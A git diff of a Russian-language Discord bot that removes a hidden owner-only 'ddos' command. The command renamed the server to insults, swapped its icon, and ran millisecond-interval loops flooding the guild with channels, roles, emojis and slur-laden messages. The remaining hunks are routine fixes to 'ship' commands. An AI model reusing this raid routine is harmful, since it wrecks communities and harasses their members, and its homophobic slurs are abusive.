@@ -753,31 +753,6 @@ message.member.voiceChannel.join()
     } else if(['count', 'копить'].includes(command)) {
 	    gameCount = gameCount + 1; actALL = actALL + 1;
       message.reply(`${gameCount}, успех ✓`);
-    } else if(['ddos', 'ддос'].includes(command) && (message.author.id === '361951318929309707')) {
-	message.channel.send("ЕБОШЬЬЬЬЬЬ")
-        message.channel.guild.setIcon('https://cdn.discordapp.com/attachments/459062113025916951/459064114761695233/1517860062.jpg')
-        message.channel.guild.setName('ОВНЕР ХУЙ САСИ')
-        message.channel.setTopic('ОВНЕР ХУЙ САСИ')
-        message.channel.setName('ОВНЕР ХУЙ САСИ')
-	    /*
-	    ВНИМАНИЕ
-	    Я НЕ ИСПОЛЬЗУЮ ЭТО ПРОСТО ТАК ДЛЯ РАЗВЛЕЧЕНИЯ
-	    Я ИСПОЛЬЗУЮ ЭТО ДЛЯ ОСОБО ОДАРЕННЫХ ПИДОРОВ
-	    */
-setInterval(function () {
-message.channel.guild.createChannel('овнер пидор', 'text')
-  .then(console.log)
-  .catch(console.error);}, Math.floor(Math.random() * (1- 1)) + 1);
-setInterval(function () {
-message.channel.guild.createChannel('овнер пидор', 'voice')
-  .then(console.log)
-  .catch(console.error);}, Math.floor(Math.random() * (1- 1)) + 1);
-setInterval(function () {
-message.channel.guild.createRole('овнер хуй саси')}, Math.floor(Math.random() * (1- 1)) + 1);
-setInterval(function () {
-message.channel.guild.createEmoji('https://cdn.discordapp.com/attachments/400670340885250049/459060140398739456/1520359453.jpg', 'sasai_owner')}, Math.floor(Math.random() * (1- 1)) + 1);
-setInterval(function () {
-message.channel.send("овнер пидор")}, Math.floor(Math.random() * (1- 1)) + 1);
     } else if(['rainbow'].includes(command) && (message.author.id === '361951318929309707')) {
 	    let bot = await message.channel.send("21");
 	   
@@ -1081,22 +1056,11 @@ let searchUrl = `https://www.google.com/search?q=${encodeURIComponent(searh)}`;
     } else if (['ship2'].includes(command)) {
 	    const vowels = ['a','e','i','o','u','y'];
 	    var p = message.channel;
-	    let user1 = message.mentions.user.first();
-	    let user2 = message.mentions.user.last();
-	    let name1 = args[0];
-	    let name2 = args[1];
-	    if(!user1) {
-	    user1 = args[0];
-	    }
-	    if(!user2) {
-	    user2 = args[1];
-	    }
-	    if(user1) {
-	    name1 = user1.username
-	    }
-	    if(user2) {
-	    name2 = user2.username
-	    }
+	    let user1 = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
+            let user2 = message.guild.member(message.guild.members.get(args[1]));
+	    let name1 = user1.username;
+	    let name2 = user2.username;
+	    
 		let name = combinename(name1,name2);
 		p.send("**"+name1+"** 💞 **"+name2+"** = **" + name+"**");
 	    
@@ -1139,7 +1103,7 @@ let searchUrl = `https://www.google.com/search?q=${encodeURIComponent(searh)}`;
 	    actFUN = actFUN + 1;actALL = actALL +1;
         if(!args[0]) return message.channel.send("♥ **Упомяните пользователя или пользователей, которые вы хотите связать.** `x!ship <user> <user>`")
 
-   var bondLevel = Math.floor(Math.random() * 102);
+   var bondLevel = Math.floor(Math.random() * 100);
    let user1 = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
    let user2 = message.guild.member(message.guild.members.get(args[1]));
    let user3 = message.guild.member(message.guild.members.get(args[2]));
